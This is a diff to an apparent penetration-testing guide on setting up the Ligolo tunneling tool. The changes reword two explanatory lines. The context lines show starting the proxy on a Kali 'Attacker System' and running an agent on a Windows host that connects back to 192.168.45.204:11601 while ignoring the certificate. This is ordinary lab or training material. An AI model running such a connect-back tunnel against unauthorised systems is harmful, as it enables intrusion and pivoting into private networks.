@@ -15,11 +15,11 @@ Up And Running the Network adapter ligolo </br >
 sudo ip link set dev ligolo up
 ```
 
-Start Ligolo from kali Linux (Attacker System) </br >
+Start Ligolo from kali Linux (Attacker System), It will start the Ligolo Interface with port address </br >
 ```
 >./Lproxy -selfcert (Mention Port below)
 ```
-Connecting to attackers machine </br >
+Connecting to attackers machine, Ignoring certificate </br >
 ```
 WIN_PS>.\Lagent -connect 192.168.45.204:11601 -ignore-cert
 ```
